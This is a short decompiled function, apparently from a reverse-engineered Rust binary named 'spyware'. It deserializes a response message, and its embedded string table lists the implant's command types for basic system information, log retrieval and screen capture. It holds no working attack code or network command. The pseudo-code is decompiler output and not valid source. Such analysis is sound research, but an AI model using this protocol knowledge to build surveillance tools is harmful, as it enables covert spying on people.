long long spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::GetBasicInfoResponse>::deserialize(unsigned long long a0, unsigned long long a1)
{
    a0.deserialize_struct(a1, "GetBasicInfoResponseversiontarget_osoperating_system_versionpointer_widthGetLogsRequestGetLogsResponseGetScreenshotRequestDisplayScreenshotbufferwidthheightGetScreenshotResponsedisplays_screenshotsMessage", 20);
    return a0;
}
